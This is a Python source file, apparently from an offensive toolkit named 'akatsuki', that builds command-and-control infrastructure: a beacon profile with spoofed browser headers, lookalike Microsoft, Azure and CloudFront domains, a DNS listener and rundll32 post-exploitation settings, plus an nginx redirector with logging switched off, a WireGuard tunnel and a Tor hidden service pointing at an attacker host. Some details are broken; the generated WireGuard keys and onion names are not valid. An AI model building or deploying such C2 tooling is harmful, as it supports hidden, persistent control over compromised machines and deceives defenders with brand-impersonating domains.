import json
import os
import sys
import random
import string
from datetime import datetime
sys.path.insert(0, os.path.dirname(__file__))

class C2Builder:
    def __init__(self):
        self.fallback_domains = ["microsoft-update{id}.com", "cdn-azure{id}.net", "cloudfront-cdn{id}.org"]
        self.redirector_ports = [443, 8443, 4443, 9443, 8080]

    def _rand_id(self, length: int = 6) -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_cs_profile(self, lhost: str, lport: int = 443) -> dict:
        profile = {
            "name": "akatsuki_c2_profile",
            "sleep": "60 30", "jitter": "30",
            "http_config": {"headers": [
                {"name": "User-Agent", "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                {"name": "Accept", "value": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
            ]},
            "https_config": {"hosts": [f"www.{d.format(id=self._rand_id())}" for d in self.fallback_domains]},
            "dns_config": {"beacon": "none", "sleep": 120},
            "listeners": [
                {"type": "https", "host": lhost, "port": lport, "profile": "akatsuki_c2_profile"},
                {"type": "dns", "host": f"dns{self._rand_id(4)}.{self._rand_id()}.com", "port": 53},
            ],
            "post_ex": {"pipename": f"akatsuki_{self._rand_id(8)}", "spawnto": "rundll32.exe"},
        }
        return profile

    def generate_redirector(self, lhost: str, lport: int) -> str:
        return f"""server {{
    listen {random.choice(self.redirector_ports)} ssl http2;
    server_name www.{self._rand_id()}.com;
    ssl_certificate /etc/ssl/certs/selfsigned.crt;
    ssl_certificate_key /etc/ssl/private/selfsigned.key;
    location / {{
        proxy_pass https://{lhost}:{lport};
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_verify off;
    }}
    access_log off;
    error_log /dev/null;
}}"""

    def generate_wireguard(self, lhost: str) -> dict:
        private = "".join(random.choices(string.ascii_letters + string.digits, k=32))
        public = "".join(random.choices(string.ascii_letters + string.digits, k=32))
        return {
            "interface": {"PrivateKey": private, "Address": "10.0.0.1/24", "ListenPort": 51820},
            "peer": {"PublicKey": public, "AllowedIPs": "10.0.0.0/24, 172.16.0.0/12", "Endpoint": f"{lhost}:51820", "PersistentKeepalive": 25}
        }

    def generate_tor_hidden_service(self, local_port: int = 8080) -> str:
        onion = "".join(random.choices(string.ascii_lowercase + "2-7", k=16))
        return f"HiddenServiceDir /var/lib/tor/akatsuki_{onion[:8]}/\nHiddenServicePort 80 127.0.0.1:{local_port}\n# HS: {onion}.onion"

    def generate_all(self, lhost: str, lport: int = 443) -> dict:
        return {
            "c2_type": "multi-protocol",
            "host": lhost,
            "primary_port": lport,
            "cs_profile": self.generate_cs_profile(lhost, lport),
            "nginx_redirector": self.generate_redirector(lhost, lport),
            "wireguard": self.generate_wireguard(lhost),
            "tor_hidden_service": self.generate_tor_hidden_service(lport),
            "generated_at": datetime.now().isoformat(),
        }


